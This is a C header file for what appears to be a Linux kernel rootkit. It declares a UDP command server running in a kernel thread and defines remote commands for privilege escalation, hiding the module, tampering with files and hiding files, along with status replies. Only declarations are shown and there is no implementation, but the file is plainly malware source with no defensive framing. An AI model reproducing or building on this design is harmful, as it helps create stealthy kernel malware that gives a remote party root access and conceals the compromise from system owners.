#ifndef SERV_H
#define SERV_H

#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/kthread.h>
#include <linux/netdevice.h>
#include <linux/ip.h>
#include <linux/inet.h>
#include <linux/delay.h>
#include <linux/timer.h>

#define MAX_RESPONSE 128

/* commands */
#define DO_PRIV_ESC "do-privesc"
#define UNDO_PRIV_ESC "undo-privesc"
#define DO_HIDE_MODULE "hide-module"
#define DO_SHOW_MODULE "show-module"
#define DO_TAMPER_FILE "tamper-file"
#define DO_HIDE_FILE "hide-file"

/* responses */
#define RESP_PRIV_DO "[LRZS] % PRIVESC DONE\n"
#define RESP_PRIV_UNDO "[LRZS] % PRIVESC UNDONE\n"
#define RESP_HIDE_MODULE_DO "[LRZS] % MODULE HIDING DONE\n"
#define RESP_SHOW_MODULE_DO "[LRZS] % MODULE HIDING UNDONE\n"

/* struct for udp kernel thread */
struct kthread_t {
  struct task_struct *curr;
  struct socket *sock;
  struct sockaddr_in addr;
  int running;
};

int server_start(void);
void server_stop(void);
int server_rcv(struct socket *sock, struct sockaddr_in *addr, unsigned char *buf, int len);
int server_snd(struct socket *sock, struct sockaddr_in *addr, unsigned char *buf, int len);
void server_do(const char *command, struct sockaddr_in *addr);

#endif
